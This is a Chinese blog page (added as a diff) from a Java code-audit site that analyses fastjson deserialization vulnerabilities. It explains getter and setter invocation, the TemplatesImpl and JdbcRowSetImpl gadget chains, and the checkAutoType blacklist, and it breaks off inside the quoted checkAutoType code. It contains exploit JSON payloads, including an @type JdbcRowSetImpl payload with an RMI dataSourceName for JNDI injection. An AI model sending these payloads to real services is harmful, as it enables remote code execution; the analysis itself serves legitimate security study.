@@ -1,0 +1,1681 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="fastjson反序列化漏洞分析, Java 代码审计">
+    <meta name="description" content="fastjson基础知识构建一个Student类进行序列化与反序列化的认识。
+public class Student {
+    public String name;
+    private int number;
+    privat">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>fastjson反序列化漏洞分析 | Red6380</title>
+    <link rel="icon" type="image/jpeg" href="/medias/log02.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Red6380" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/log02.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Red6380</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/log02.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Red6380</div>
+        <div class="logo-desc">
+            
+            java 代码审计
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">fastjson反序列化漏洞分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">反序列化</span>
+                            </a>
+                        
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/java/" class="post-category">
+                                java
+                            </a>
+                        
+                            <a href="/categories/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                反序列化
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-03-19
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="fastjson基础知识"><a href="#fastjson基础知识" class="headerlink" title="fastjson基础知识"></a>fastjson基础知识</h1><p>构建一个Student类进行序列化与反序列化的认识。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">int</span> number<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">Properties</span> properties<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参构造函数！！！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> number<span class="token punctuation">,</span><span class="token class-name">Properties</span> properties<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token operator">=</span>number<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>properties<span class="token operator">=</span>properties<span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参构造函数！！！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"public属性，getName()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"public属性，setName()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"private属性，getNumber()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> number<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Properties</span> <span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"private属性，getProperties()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> properties<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>使用JSON.toJSONString()将对象序列化为json格式的字符串，此方法序列化时需要设置一个SerializerFeature.WriteClassName属性值才会输出带@type类名的字符串。且在进行对象序列化时会执行所有的getter方法。</p>
+<img src="/fastjson/01.png" class="">
+
+
+
+<img src="/fastjson/02.png" class="">
+
+
+
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>使用json.parse()方法将带@type指定类名的json字符串反序列为指定类对象时，无需额外指定类名；</p>
+<p>使用json.parseObject()方法进行反序列化时，若指定类则返回对应的对象，不指定类则返回JSONObject类。</p>
+<p>当json.parseObject()方法不指定类时，会先执行parse()后多执行了一个类型转化JSON.toJSON(obj)方法，即将反序列化后的对象转化为JSONObject类。</p>
+<img src="/fastjson/03.png" class="">
+
+
+
+<p>分别执行parseObject和parse方法对比一下就一目了然。parseObject多调用了一部分方法即getter方法。</p>
+<img src="/fastjson/04.png" class="">
+
+
+
+<img src="/fastjson/05.png" class="">
+
+
+
+<p>当json.parseObject()方法指定类时，输出结果和json.parse()方法一致。</p>
+<img src="/fastjson/06.png" class="">
+
+
+
+<p>若反序列化时需要把private属性也还原出来则需要加入Feature.SupportNonPublicField 参数值。若不加此参数，虽然不能把private属性还原出来，但是也会调用相应的getter方法。</p>
+<img src="/fastjson/07.png" class="">
+
+
+
+<img src="/fastjson/08.png" class="">
+
+
+
+<p>由于此处的getProperties()方法的返回类型为Properties类，此类继承了Hashtable类，Hashtable类又继承了Map类，所以此处反序列化时也调用此getter方法。</p>
+<img src="/fastjson/09.png" class="">
+
+
+
+<h2 id="fastjson反序列化总结"><a href="#fastjson反序列化总结" class="headerlink" title="fastjson反序列化总结"></a>fastjson反序列化总结</h2><p>反序列化调用的setter方法需要满足：</p>
+<ul>
+<li>非静态函数</li>
+<li>返回类型为void或当前类</li>
+<li>参数个数为1个</li>
+</ul>
+<p>反序列化调用的getter方法需要满足：</p>
+<ul>
+<li>非静态函数</li>
+<li>无参数</li>
+<li>返回值类型继承自Collection或Map或AtomicBoolean或Atomiclnteget或AtomicLong</li>
+</ul>
+<h1 id="FastJson各版本反序列化漏洞"><a href="#FastJson各版本反序列化漏洞" class="headerlink" title="FastJson各版本反序列化漏洞"></a>FastJson各版本反序列化漏洞</h1><h2 id="1-2-22-lt-fastjson-lt-1-2-24"><a href="#1-2-22-lt-fastjson-lt-1-2-24" class="headerlink" title="1.2.22<=fastjson<=1.2.24"></a>1.2.22&lt;=fastjson&lt;=1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用</p>
+<p>入口函数为getOutputProperties(),此方法满足fastjson反序列化时自动调用的getter方法。</p>
+<p>会先进入newTransformer()方法。</p>
+<img src="/fastjson/10.png" class="">
+
+
+
+<p>然后会进入到getTransletInstance()。</p>
+<img src="/fastjson/11.png" class="">
+
+
+
+<p>最后会来到CC3链的利用。</p>
+<img src="/fastjson/12.png" class="">
+
+
+
+<p>要想执行到defineTransletClasses()方法，_name不能为null, _class必须为null,因为 _class本身就为null，所以可以不用管。</p>
+<p>接着来到defineTransletClasses()。</p>
+<img src="/fastjson/13.png" class="">
+
+<p> 若想执行到loader.defineClass方法，则_tfactory不能为null否则会提前报错退出程序, _bytecodes即为恶意类的字节码。</p>
+<p>经调试，还需要_outputProperties也不为空，因为入口getOutputProperties()方法即为 _outputProperties属性的getter方法。</p>
+<p>此外还需要注意，传入的恶意类字节码需要经过base64编码并且恶意类需要继承AbstractTranslet类，因为Fastjson提取byte[]数组字段值时会进行Base64解码</p>
+<p>最终利用链</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">getOutputProperties()---&gt;newTransformer()---&gt;TransformerImpl()---&gt;getTransletInstance()--&gt;defineTransletClasses()--&gt;defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>EXP</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token string">"恶意类字节码"</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"red6380"</span><span class="token punctuation">,</span><span class="token property">"_tfactory"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><h4 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
+<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p>
+<p>入口方法为setAutoCommit()。此方法满足fastjson反序列化时自动调用的setter方法。</p>
+<img src="/fastjson/14.png" class="">
+
+
+
+<p>this.conn在类的无参构造函数时赋值为null,所以会进入到this.connect()方法中。</p>
+<p>很明显，此处为JNDI注入的入口点，只需要this.getDataSourceName()可控即可。</p>
+<img src="/fastjson/15.png" class="">
+
+
+
+<p>setDataSourceName()方法即为设置getDataSourceName()值，此方法为dataSourceName属性的setter方法，同样满足fastjson反序列时自动调用的setter方法。</p>
+<img src="/fastjson/16.png" class="">
+
+
+
+<p>EXP</p>
+<pre class="line-numbers language-none"><code class="language-none">{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1089/Evi","autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="1-2-25-lt-Fastjson-lt-1-2-41绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-41绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.41绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.41绕过</h2><h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h3><p>1.2.25及之后版本多了一个checkAutoType方法来防护反序列化漏洞，其原理是通过黑名单的方式将可能造成反序列化漏洞的类禁止其反序列化对象。</p>
+<img src="/fastjson/17.png" class="">
+
+
+
+<p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p>
+<p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> expectClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span> className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'$'</span><span class="token punctuation">,</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+                <span class="token class-name">String</span> deny<span class="token punctuation">;</span>
+                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">return</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token class-name">String</span> accept<span class="token punctuation">;</span>
+                    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span>
+
+                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
